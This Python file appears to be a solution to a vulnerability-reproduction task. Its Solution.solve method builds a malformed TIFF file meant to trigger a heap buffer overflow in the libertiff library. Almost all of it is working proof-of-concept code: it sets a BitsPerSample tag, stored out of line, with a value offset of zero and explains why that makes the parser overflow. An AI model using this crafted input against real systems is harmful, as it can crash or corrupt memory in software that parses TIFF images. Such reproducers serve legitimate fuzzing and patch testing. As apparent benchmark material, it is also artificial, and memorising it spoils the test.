import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability in libertiff.
        The vulnerability is a Heap Buffer Overflow caused by an invalid offline tag 
        with a value offset of zero.
        """
        # Build the TIFF file components
        poc = bytearray()
        
        # 1. Header (8 bytes)
        # Byte Order: Little Endian ("II" = 0x4949)
        # Magic: 42 (0x002A)
        # Offset to 0th IFD: 8 (0x00000008)
        poc.extend(b'II\x2a\x00\x08\x00\x00\x00')
        
        # 2. Image File Directory (IFD)
        # Located at offset 8.
        # We need to construct an IFD with a tag that triggers the vulnerability.
        # Vulnerability condition: Offline tag (size > 4 bytes) with Value Offset = 0.
        
        # Tags to include (must be sorted by Tag ID):
        # 256 (0x100) ImageWidth
        # 257 (0x101) ImageLength
        # 258 (0x102) BitsPerSample - TRIGGER CANDIDATE
        #             Type: SHORT (3), Count: 3 (for RGB). Total size: 3*2 = 6 bytes (> 4).
        #             Offset: 0. 
        #             This causes the parser to read the file header as the BitsPerSample values.
        # 259 (0x103) Compression
        # 262 (0x106) PhotometricInterpretation
        # 273 (0x111) StripOffsets
        # 277 (0x115) SamplesPerPixel
        # 278 (0x116) RowsPerStrip
        # 279 (0x117) StripByteCounts
        
        tags = [
            (256, 4, 1, 16),      # ImageWidth: 16
            (257, 4, 1, 16),      # ImageLength: 16
            (258, 3, 3, 0),       # BitsPerSample: Count 3 (Size 6), Offset 0 -> TRIGGER
            (259, 3, 1, 1),       # Compression: 1 (None)
            (262, 3, 1, 2),       # PhotometricInterpretation: 2 (RGB)
            (273, 4, 1, 122),     # StripOffsets: Points to data at end of IFD (8 + 2 + 9*12 + 4 = 122)
            (277, 3, 1, 3),       # SamplesPerPixel: 3
            (278, 4, 1, 16),      # RowsPerStrip: 16
            (279, 4, 1, 1),       # StripByteCounts: 1 byte of data
        ]
        
        # Number of directory entries (2 bytes)
        poc.extend(struct.pack('<H', len(tags)))
        
        # Write the directory entries (12 bytes each)
        for tag_id, type_id, count, val_or_off in tags:
            # Struct format: Tag(2), Type(2), Count(4), Value/Offset(4)
            poc.extend(struct.pack('<HHII', tag_id, type_id, count, val_or_off))
            
        # Offset to next IFD (4 bytes) - 0 indicates end
        poc.extend(struct.pack('<I', 0))
        
        # 3. Image Data
        # Current length matches the StripOffsets value (122 bytes)
        # Add 1 byte of data as specified by StripByteCounts
        poc.extend(b'\x00')
        
        return bytes(poc)
